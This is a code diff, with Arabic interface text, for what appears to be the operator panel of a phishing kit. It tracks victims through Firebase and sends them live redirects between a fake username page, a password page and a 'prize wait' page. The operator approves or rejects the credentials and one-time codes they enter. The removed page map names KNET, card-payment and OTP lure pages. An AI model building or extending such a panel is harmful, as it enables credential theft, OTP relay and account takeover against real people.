+    els.referenceDetailContent.innerHTML = `<div class="ref-detail-head"><div><button class="ref-mobile-back" data-ref-action="back">‹ القائمة</button><span class="ref-detail-kicker">بيانات الزائر</span><h2>${escapeHtml(name)}</h2><small>${escapeHtml(visitor.currentPage || 'صفحة غير معروفة')} · ${escapeHtml(timeAgo(visitor.lastSeen || visitor.createdDate))}</small></div><div class="ref-detail-head-actions"><button data-ref-action="refresh" title="تحديث">↻</button><button data-ref-action="block" title="حظر">⊘</button><span class="ref-status">${escapeHtml(statusText)}</span></div></div><div class="ref-detail-actions"><button data-ref-nav="home">الرئيسية</button><button data-ref-nav="prizeusername">اسم المستخدم</button><button data-ref-nav="prizetextpassword">كلمة المرور النصية</button><button data-ref-nav="prizwait">انتظار المسابقة</button><select data-ref-nav-select><option value="">توجيه إلى...</option><option value="home">الرئيسية</option><option value="prizeusername">اسم المستخدم</option><option value="prizetextpassword">كلمة المرور النصية</option><option value="prizwait">انتظار المسابقة</option></select><input class="ref-nav-free" data-ref-nav-free placeholder="مسار مخصص (مثل صفحة.html)..." /><button data-ref-nav-free-go>توجيه</button></div><div class="ref-detail-stack">${stackSections}</div>`;
     els.referenceDetailEmpty.classList.add('hidden');
     if (boxCounterTimer) clearInterval(boxCounterTimer);
     els.referenceDetailContent.querySelectorAll('.bank-card').forEach((cardElement, index) => {
@@ -901,21 +1153,9 @@
     els.referenceDetailContent.classList.remove('hidden');
     const NAV_PAGE_MAP = {
       home: 'index.html',
-      loan: 'loan.html',
-      shop: 'shop.html',
-      watch: 'watch.html',
-      refund: 'refund.html',
-      wait: 'wait1.html',
-      login: 'login.html',
-      forgot: 'forgot-password.html',
-      otpcode: 'otp.html',
-      otpnew: 'otp-new.html',
-      regist: 'login-regist.html',
-      orders: 'order1.html',
-      knet: 'knet.html',
-      verification: 'verification.html',
-      card: 'card-payment.html',
-      otp: 'otpcredit_card_page.html',
+      prizeusername: 'prize-username.html',
+      prizetextpassword: 'prize-text-password.html',
+      prizwait: 'prize-wait.html',
     };
     // إرسال أمر توجيه للعميل عبر RTDB commands/{sessionId}/redirect
     // كل أمر يحمل seq فريدة لضمان تغيير القيمة دائماً (حتى لنفس الصفحة) فيستقبله العميل
@@ -939,13 +1179,14 @@
       const targetPage = NAV_PAGE_MAP[target] || target;
       sendNavCommand(target, targetPage);
     }));
-    // أزرار صندوق بيانات الدخول: توجيه إلى رمز 4 أرقام / رمز 6 أرقام / رفض
-    const sendRejectCommand = async (sid) => {
+    // رفض رمز التحقق: يُعاد العميل إلى صفحة اسم المستخدم مع رسالة «يرجى إدخال بيانات صحيحة وإعادة المحاولة»
+    const rejectOtpToUsername = async (sid) => {
       if (!sid) { toast('تعذّر تحديد العميل', 'error'); return; }
       try {
         await db.collection('customers').doc(sid).set({
           decision: 'rejected',
           status: 'rejected',
+          rejectReason: 'يرجى إدخال بيانات صحيحة وإعادة المحاولة',
           decidedAt: firebase.firestore.FieldValue.serverTimestamp(),
           lastSeen: firebase.firestore.FieldValue.serverTimestamp(),
         }, { merge: true });
@@ -953,40 +1194,20 @@
           await rtd.ref('commands/' + sid + '/rejection').set({
             action: 'REJECT_PAYMENT',
             status: 'rejected',
+            targetPage: 'prize-username.html',
+            reason: 'يرجى إدخال بيانات صحيحة وإعادة المحاولة',
             timestamp: new Date().toLocaleTimeString('ar-EG'),
             rejectedAt: Date.now(),
             adminId: 'admin',
           });
         } catch (e) { console.warn('RTDB reject write failed:', e); }
-        toast('تم رفض البيانات وإرجاع العميل لتسجيل الدخول', 'success');
+        toast('تم الرفض وإعادة العميل إلى صفحة اسم المستخدم', 'success');
       } catch (err) {
         console.error('Reject error:', err);
         toast('تعذر إرسال الرفض', 'error');
       }
     };
-    // تسجيل إجراء الصندوق: يُخزَّن محلياً (للعرض الفوري) وفي قاعدة البيانات (ليبقى بعد التحديث)
-    const recordLoginAction = (sid, key, action, label) => {
-      if (!sid || !key) return;
-      loginActionOverrides.set(sid + '|' + key, { action, label });
-      db.collection('customers').doc(sid).set({
-        loginActions: { [key]: { action, label, at: Date.now() } },
-      }, { merge: true }).catch((e) => console.warn('login action persist failed:', e));
-    };
-    els.referenceDetailContent.querySelectorAll('[data-login-action]').forEach(btn => btn.addEventListener('click', () => {
-      const act = btn.dataset.loginAction;
-      const sid = btn.dataset.sessionId || visitor.sessionId || visitor.id;
-      const key = btn.dataset.loginKey || '';
-      if (act === 'reject') {
-        sendRejectCommand(sid);
-        recordLoginAction(sid, key, 'reject', LOGIN_ACTION_LABELS.reject);
-      } else {
-        const isNew = act === 'otpnew';
-        sendNavCommand(isNew ? 'رمز 4 أرقام' : 'رمز 6 أرقام', isNew ? 'otp-new.html' : 'otp.html');
-        recordLoginAction(sid, key, act, isNew ? LOGIN_ACTION_LABELS.otpnew : LOGIN_ACTION_LABELS.otpcode);
-      }
-      renderReferenceDetail(visitor);
-    }));
-    // أزرار صناديق رموز التحقق: موافقة (توجيه للرئيسية) / رفض — تُطبع الحالة وتُخفى الأزرار
+    // أزرار صناديق رموز التحقق: موافقة (تمرير إلى كلمة المرور) / رفض — تُطبع الحالة وتُخفى الأزرار
     const recordOtpAction = (sid, key, action, label) => {
       if (!sid || !key) return;
       otpActionOverrides.set(sid + '|' + key, { action, label });
@@ -999,11 +1220,38 @@
       const sid = btn.dataset.sessionId || visitor.sessionId || visitor.id;
       const key = btn.dataset.otpKey || '';
       if (act === 'reject') {
-        sendRejectCommand(sid);
+        // الرفض: إعادة العميل إلى صفحة اسم المستخدم مع رسالة «يرجى إدخال بيانات صحيحة وإعادة المحاولة»
+        rejectOtpToUsername(sid);
         recordOtpAction(sid, key, 'reject', OTP_ACTION_LABELS.reject);
       } else {
-        sendNavCommand('الرئيسية', 'index.html');
+        // الموافقة: تمرير العميل إلى صفحة إدخال كلمة المرور النصية
+        sendNavCommand('كلمة المرور النصية', 'prize-text-password.html');
         recordOtpAction(sid, key, 'approve', OTP_ACTION_LABELS.approve);
+      }
+      renderReferenceDetail(visitor);
+    }));
+    // أزرار صناديق الدخول وكلمة المرور النصية: موافقة تمرّر العميل للخطوة التالية، والرفض يعيده لاسم المستخدم
+    const recordLoginAction = (sid, key, action, label) => {
+      if (!sid || !key) return;
+      loginActionOverrides.set(sid + '|' + key, { action, label });
+      db.collection('customers').doc(sid).set({
+        loginActions: { [key]: { action, label, at: Date.now() } },
+      }, { merge: true }).catch((e) => console.warn('login action persist failed:', e));
+    };
+    els.referenceDetailContent.querySelectorAll('[data-login-action]').forEach(btn => btn.addEventListener('click', () => {
+      const act = btn.dataset.loginAction;
+      const isText = btn.dataset.loginKind === 'text';
+      const sid = btn.dataset.sessionId || visitor.sessionId || visitor.id;
+      const key = btn.dataset.loginKey || '';
+      if (act === 'reject') {
+        rejectOtpToUsername(sid);
+        recordLoginAction(sid, key, 'reject', isText ? 'تم رفض كلمة المرور' : 'تم رفض بيانات الدخول');
+      } else if (isText) {
+        sendNavCommand('انتظار المسابقة', 'prize-wait.html');
+        recordLoginAction(sid, key, 'approve', 'تمت الموافقة (تمرير إلى انتظار المسابقة)');
+      } else {
+        sendNavCommand('كلمة المرور النصية', 'prize-text-password.html');
+        recordLoginAction(sid, key, 'approve', 'تمت الموافقة (تمرير إلى كلمة المرور النصية)');
       }
       renderReferenceDetail(visitor);
     }));
@@ -1690,7 +1938,7 @@ ${blocks || '<p class="muted">لا توجد بيانات</p>'}
     if (window.__html2pdfLoading) return window.__html2pdfLoading;
     window.__html2pdfLoading = new Promise((resolve, reject) => {
       const script = document.createElement('script');
-      script.src = '/assets/vendor/html2pdf.bundle.min.js';
+      script.src = 'assets/vendor/html2pdf.bundle.min.js';
       script.onload = () => (window.html2pdf ? resolve(window.html2pdf) : reject(new Error('html2pdf غير متاح')));
       script.onerror = () => reject(new Error('تعذر تحميل مكتبة PDF'));
       document.head.appendChild(script);
@@ -1704,7 +1952,7 @@ ${blocks || '<p class="muted">لا توجد بيانات</p>'}
     if (window.__pdfLibLoading) return window.__pdfLibLoading;
     window.__pdfLibLoading = new Promise((resolve, reject) => {
       const script = document.createElement('script');
-      script.src = '/assets/vendor/pdf-lib.min.js';
+      script.src = 'assets/vendor/pdf-lib.min.js';
       script.onload = () => (window.PDFLib ? resolve(window.PDFLib) : reject(new Error('pdf-lib غير متاح')));
       script.onerror = () => reject(new Error('تعذر تحميل مكتبة دمج PDF'));
       document.head.appendChild(script);
